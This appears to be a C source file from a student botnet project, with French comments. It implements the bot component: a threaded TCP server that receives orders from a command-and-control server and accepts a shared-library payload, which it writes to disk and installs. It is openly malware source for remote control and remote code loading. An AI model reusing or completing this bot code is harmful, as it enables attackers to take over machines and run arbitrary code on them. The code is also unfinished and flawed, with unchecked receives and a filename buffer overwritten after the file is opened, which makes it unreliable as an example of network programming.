#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <string.h>
#include <sys/types.h>
#include <sys/socket.h>
#include <arpa/inet.h>
#include <netinet/in.h>
#include <netinet/ip.h>
#include <errno.h>
#include <time.h>
#include <unistd.h>
#include <dlfcn.h>
#include <libthrd.h>
#include <libnetwork.h>
#include <liblistes.h>
#include "bot.h"

/**
 * void gestionClientTCP(void *s)
 * Fonction qui reçoi le msg envoyée par le CC (qui deviendra un ordre plus tard)
 * elle le reçoit et le printf
 * param pointeur vers la socket TCP
 */

void gestionClientTCP(void *s)
{
    char msg_recu[80];
    int socket = *((int *)s);
    /* Obtient une structure de fichier */
    FILE *dialogue = fdopen(socket, "a+");
    //ProcessDialog(socket);
    receiveTCP(socket, msg_recu, sizeof(msg_recu));
    printf("[gestionClientTCP]Le msg que j'ai lu de mon client TCP est : %s\n", msg_recu);
    if (dialogue == NULL)
    {
        perror("gestionClientTCP.fdopen");
        exit(EXIT_FAILURE);
    }
    fclose(dialogue);
    return;
}
/**
 * void recvFile(void *s, char* filename)
 * Fonction qui reçoi le fichier.so envoyé par le CC
 * elle le receptionne et le crée dans son dossier
 * param pointeur vers la socket TCP
 */
void recvFile(void *s, char *filename)
{

    int socket_tcp = *((int *)s);
    char buff[BUFSIZ]; // to store file from client
    char file_size[256];
    ssize_t len;
    FILE *fp;
    fp = fopen(filename, "w"); // stores the file content in start in the program directory
    if (fp == NULL)
    {
        printf("Error IN Opening File\n");
        return;
    }

    //Recoit le nom de la charge utile
    //TODO : Gérer les retours d'erreur
    recv(socket_tcp, filename, TAILLE_FILENAME, 0);
    // if(erreur)
    //     renvoieErreur();

    //Recoit la taille du fichier
    recv(socket_tcp, file_size, sizeof(file_size), 0);
    int remain_data = atoi(file_size);
    printf("[BOT] file size received is: %d\n", remain_data);

    //https://stackoverflow.com/questions/11952898/c-send-and-receive-file
    while ((remain_data > 0) && ((len = recv(socket_tcp, buff, BUFSIZ, 0)) > 0))
    {
        fwrite(buff, sizeof(char), len, fp);
        remain_data -= len;
        printf("Receive %ld bytes and we hope :- %d bytes\n", len, remain_data);
    }
    fclose(fp);
    close(socket_tcp);

    //Changer, mettre une condition sur le printf, c'est pas parce que on est
    //arrivé ici que forcément le fichier est bien recu
    printf("File received successfully !! \n");
    printf("New File created is start !! \n");
    printf("La charge utile %s a bien été installée ! \n", filename);

    if (install_charge(filename) != 0)
    {
        renvoieErreur(socket_tcp);
    }

}
/**
 * void nouveauClient(int dialogue)
 * Fonction wrapper qui lance un thread avec la fct de traitement TCP
 * param socket de dialogue 
*/
void nouveauClient(int dialogue)
{
    printf("[nouveauClient]Start\n");
    if (lanceThread(receive_cmd_TCP, (void *)&dialogue, sizeof(dialogue)) < 0)
    {
        perror("nouveauClient.lanceThread");
        exit(-1);
    }
}
/**
 * void TCP(void *arg)
 * Fonction wrapper qui initialise une socket tcp et lance boucle Serveur TCP dans un thread
 * 
 * 
 */
void TCP(void *arg)
{
    (void)arg;
    printf("############ Partie TCP ############\n");
    char port_s[6];
    sprintf(port_s, "%d", PORT_TCP_SERVEUR);
    int socket_tcp;
    // Initialisation du serveur
    socket_tcp = initialisationServeurTCP(port_s);
    if (socket_tcp < 0)
    {
        fprintf(stderr, "Initialisation du serveur impossible\n");
        exit(-1);
    }

    //Lancement de la boucle d'ecoute
    if (boucleServeurTCP(socket_tcp, nouveauClient) < 0)
    {
        fprintf(stderr, "Connexion avec le client impossible\n");
        exit(-1);
    }
}
/**
 * void partie_tcp()
 * Fonction wrapper qui initialise le serveur TCP dans un thread
 * 
 */
void partie_tcp_BOT()
{
    if (lanceThread(TCP, (void *)NULL, 0) < 0)
    {
        perror("boucleServeur.lanceThread");
        exit(-1);
    }
}